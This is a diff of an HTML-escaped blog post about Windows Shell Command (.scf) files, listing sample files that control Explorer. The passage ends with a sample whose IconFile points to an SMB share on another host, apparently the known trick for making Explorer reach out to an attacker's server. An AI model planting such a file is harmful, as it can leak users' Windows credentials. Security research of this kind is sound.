@@ -21,27 +21,27 @@ so I went digging. Turns out they are a simple text based file that
 controls Windows Explorer. ;-)&lt;/p&gt;
 &lt;p&gt;Here are the examples I found via the references:&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Open Explorer&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[Shell] 
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Shell] 
 Command = 2 
 IconFile = explorer.exe, 1
 [Taskbar] 
 Command = Explorer
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Open &amp;ldquo;Channels&amp;rdquo; page in IE:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[Shell]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Shell]
 Command=3
 IconFile=shdocvw.dll,-118
 [IE]
 Command=Channels
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This didn&amp;rsquo;t work for me at all, probably because Internet Explorer doesn&amp;rsquo;t have &amp;ldquo;Channels&amp;rdquo; anymore.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Minimize all windows:&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[Shell]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Shell]
 Command=2
 IconFile=explorer.exe,3
 [Taskbar]
 Command=ToggleDesktop
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;My first attempt to utilize this file format for fun was of course
 to just set the IconFile to an SMB share:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;[Shell]
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[Shell]
 Command=2
 IconFile=\\192.168.1.101\share\test.ico
 [Taskbar]
